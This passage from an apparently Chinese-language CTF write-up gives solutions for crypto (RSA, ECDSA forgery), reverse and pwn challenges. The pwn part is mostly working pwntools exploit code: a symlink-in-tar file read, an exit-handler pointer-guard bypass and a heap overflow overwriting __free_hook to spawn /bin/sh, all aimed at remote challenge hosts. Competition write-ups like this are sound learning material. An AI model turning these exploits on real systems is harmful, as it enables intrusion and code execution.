            d = inverse(0x10001, (p - 1) * (q - 1))
            pt = pow(ct, d, n)
            flag = long_to_bytes(pt)
    '''        
    p=13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423
    q=11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943
    d = inverse(0x10001, (p - 1) * (q - 1))
    pt = pow(ct, d, n)
    flag = long_to_bytes(pt)
    print flag
###  ECDSA
不同消息有同样的签名，切入点在可以更改公钥Q，还有就是，r是dG.x，而dG.x ==
-dG.x,由于公钥可控，相当于签名验证时的私钥k可控，所以可以自己构造方程（s1==s2）解得一个自己的私钥K，然后再用这个私钥给msg签名得到s，r =
dG.x,签名时的d自己生成就好。
    from pwn import *
    from Crypto.Util.number import *
    sh=remote("139.129.98.9","30002")
    from pwnlib.util.iters import mbruteforce
    from hashlib import sha256
    import hashlib
    from math import gcd
    context.log_level = 'debug'
    a=0
    b=7
    q=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
    gx=0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
    gy=0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
    order=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    ecc = EllipticCurve(GF(q), [a,b])
    G = ecc(gx,gy)
    import hashlib
    def sha1(content):
        return hashlib.sha1(content).digest()
    def proof_of_work(sh):
        sh.recvuntil("XXXX+")
        suffix = sh.recvuntil(')').decode("utf8")[:-1]
        log.success(suffix)
        sh.recvuntil("== ")
        cipher = sh.recvline().strip().decode("utf8")
        proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed')
        sh.sendlineafter("Give me XXXX:", proof)
    proof_of_work(sh)
    sh.recvuntil("Here is the frist message(64 bytes):")
    msg1 = sh.recvuntil("\n")[:-1]
    sh.recvuntil("Here is the second message(64 bytes):")
    msg2 = sh.recvuntil("\n")[:-1]
    message = hex(bytes_to_long(msg1))[2:]
    e1=bytes_to_long(sha1(msg1))
    e2=bytes_to_long(sha1(msg2))
    print("e1=",e1)
    print("e2=",e2)
    #pubkey = sh.recvuntil("\n")[:-2].decode()
    #r=[d * G].x
    d=12321
    r=int((d*G)[0])
    new_k = ((-e1-e2)*inverse(2*r,order))%order
    new_G = new_k * G
    new_S = ((e1-e2)*inverse(2*d,order))%order
    #new_S = ((e1 + new_k*r)*inverse(d,order))%order
    newpubkey = hex(new_G[0]).replace("0x","").rjust(64,"0")+hex(new_G[1]).replace("0x","").rjust(64,"0")
    newsignature = hex(r).replace("0x","").rjust(64,"0")+hex(new_S).replace("0x","").rjust(64,"0")
    sh.recvuntil("Please choice your options:")
    sh.sendline("3")
    sh.recvuntil("Please give me your public_key(hex):")
    sh.sendline(newpubkey)
    sh.recvuntil("Please choice your options:")
    sh.sendline("6")
    sh.recvuntil("Please give me the signature(hex) of the frist message:\n")
    sh.sendline(newsignature)
    sh.recvuntil("Please give me the signature(hex) of the second message:\n")
    sh.sendline(newsignature)
    sh.interactive()
## Reverse
###  slime_war
游戏题，通过CE可以发现其中有几个Secret可以获得，通过不断改发现应该是有5个secret来触发flag,并且都需要手玩。  
经过IDA调试发现以下几点：
  1. 打败boss
  2. 进入入口得隐藏房间
  3. 去买一个magicbox 去第二关的一个地点按t 然后最短路径走到t那个
  4. 输入whosyourdaddy
  5. 打出伤害为一个hash值（爆破后发现为666）
全部触发后得到flag
爆破伤害的hash
    import idaapi
    import idc
    flag=0
    for flag in range(467, 10000):
        GetDebuggerEvent(WFNE_SUSP, -1)
        SetRegValue(10, 'eax')
        GetDebuggerEvent(WFNE_SUSP, -1)
        SetRegValue(0x140001BC2, 'rip')
        GetDebuggerEvent(WFNE_SUSP, -1)
        RunTo(0x140001BCE)
        GetDebuggerEvent(WFNE_SUSP, -1)
        SetRegValue(flag, 'ecx')
        GetDebuggerEvent(WFNE_SUSP, -1)
        RunTo(0x140001CD8)
        GetDebuggerEvent(WFNE_SUSP, -1)
        RunTo(0x140001C09)
        GetDebuggerEvent(WFNE_SUSP, -1)
        test = GetRegValue("ZF")
        by2= get_bytes(0x00014FDF0, 5)
        print (by2)
        if(test==1):
            print ("Found:")
            print flag
            break
        GetDebuggerEvent(WFNE_SUSP, -1)
## Pwn
###  qtar
rename获得该名字的可读权限，x获得可解压权限，上传一个带有指向/home/ctf/flag软链接的压缩包，通过改名获得二次解压的权限，然后直接读即可
    from pwn import *
    import os
    sla = lambda x, y: p.sendlineafter(x, y)
    context.log_level = 'debug'
    p = remote('47.104.178.87', 49125)
    def c(file, rename):
        sla('>', 'c')
        sla('Filename: /tmp/', file)
        sla(']','y')
        sla('Arcname:', rename)
        p.recvuntil('File compressed as ')
        re = p.recv(32)
        success('COMPFILE : '+re)
        return re
    def x(file):
        sla('>', 'x')
        sla('Filename:', file)
    def u(content):
        sla('>', 'u')
        sla('Content:', content)
        p.recvuntil('/tmp/')
        re = p.recv(32)
        success('UPFILE : '+re)
        return re
    name = '/home/ctf/flag'
    os.system('rm flagln')
    os.system('ln -snf {} flagln'.format(name))
    #os.system('echo 233333>flagln')
    if 'flagln' not in os.listdir(os.getcwd()):
        exit(0)
    os.system('tar -cvzf flag.tar flagln')
    with open('flag.tar', 'r') as f:
        elf = f.read()
    vic1 = u('123')
    vic = c(vic1, '123')
    c(vic1, 'flagln')
    tar1 = u(elf)
    tar = c(tar1, vic)
    x(tar)
    x(vic)
    sla('>','r')
    sla('Filename:','flagln')
    p.interactive()
###  2a1
libc_start_main结束后执行exit，里面有个被fs:0x30加密过的dl_fini的值，通过泄露，算出fs:0x30，然后再加密system填入，参数填入binsh，拿到shell
    #!/usr/bin/python
    from pwn import *
    import sys
    #from LibcSearcher import LibcSearcher
    context.log_level = 'debug'
    context.arch='amd64'
    local=0
    binary_name='2a1'
    libc_name='libc-2.23.so'
    if local:
        p=process("./"+binary_name)
        libc=ELF("./"+libc_name)
        #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name])
        #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])
    else:
        p=remote('47.104.178.87',38378)
        e=ELF("./"+binary_name)
        libc=ELF("./"+libc_name)
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,'\x00'))
    def ROR(i,index):
        tmp = bin(i)[2:].rjust(64,"0")
        for _ in range(index):
            tmp = tmp[-1] + tmp[:-1]
        return int(tmp, 2)
    def ROL(i,index):
        tmp = bin(i)[2:].rjust(64, "0")
        for _ in range(index):
            tmp = tmp[1:] + tmp[0]
        return int(tmp, 2)
    ru('Gift: ')
    libc_base = int(p.recvline()[:-1],16)-libc.sym['alarm']
    print(hex(libc_base))
    ptr = libc_base+0x3c5c58
    print(hex(ptr))
    dl_fini=libc_base+0x3daaf0
    sa('where to read?:',p64(ptr))
    ru('data: ')
    encode_ptr = u64(p.recv(8))
    print(hex(encode_ptr))
    dl_fini_1 = ROL(dl_fini,0x11)
    print(hex(dl_fini),hex(dl_fini_1))
    key = dl_fini_1 ^ encode_ptr
    print(hex(key))
    exit_funcs=libc_base+0x3c45f8
    system_addr = libc_base+libc.sym['system']
    binsh = libc_base+0x18ce17
    encode_system = key ^ ROL(system_addr,0x11)
    sa('where to write?:',p64(exit_funcs))
    print(hex(system_addr))
    sla('msg:',b'a'*0x8+p64(1)+p64(4)+p64(encode_system)+p64(binsh))
    ia()
###  easy_pwn
3处的edit中的read存在堆溢出，可以在堆中任意写，构造两个可以show的string，通过前一处的字符串溢出到后一个string类的字符串指针，修改指针末尾为’\x10’指向堆，泄露堆地址，再修改为unsorted
bin的fd，泄露libc地址，最后指向free_hook修改为system，show的时候完成system(“/bin/sh”)
    #!/usr/bin/python
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    local=0
    binary_name='pwn'
    libc_name='libc.so.6'
    if local:
        p=process("./"+binary_name)
        libc=ELF("./"+libc_name)
    else:
        p=remote('47.105.44.8',35793)
        e=ELF("./"+binary_name)
        libc=ELF("./"+libc_name)
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,'\x00'))
    def cho(num):
        sla("choice:",str(num))
    def add():
        cho(1)
        sl('aaaaaaaa -> /bin/sh\x00bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb')
        sl('ccccccccccccccccccc -> ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd')
        sl('exit')
    def show():
        cho(2)
    def gf():
        cho(3)
    def edit(name,size,data):
        cho(4)
        sla("Non-Terminal:", name)
        sla("size:",str(size))
        sd(data)
    add()
    heap_rub = 'g'*0x18+p64(0x21)+p64(0)*3+p64(0x51)+'d'*0x40+p64(0)+p64(0x81)
    edit('c'*19,0x80000000,heap_rub+'\x10')
    show()
    ru('Grammar:\n')
    p.recv(2)
    heap_base = u64(p.recv(8))-0x250
    print(hex(heap_base))
    gf()
    edit('g'*19,0x80000000,heap_rub+p64(heap_base+0x600)+p64(0x400))
    show()
    libc_base = u64(p.recvuntil('\x7f\x00\x00')[-8:].ljust(8, '\x00')) - 0x3c4ca8
    print(hex(libc_base))
    free_hook = libc_base+libc.sym['__free_hook']
    system = libc_base+libc.sym['system']
    edit('g'*19,0x80000000,heap_rub+p64(free_hook)+p64(8))
    a = '\x00'*8
    edit(a,0x8,p64(system))
    print(hex(system))
    show()
    ia()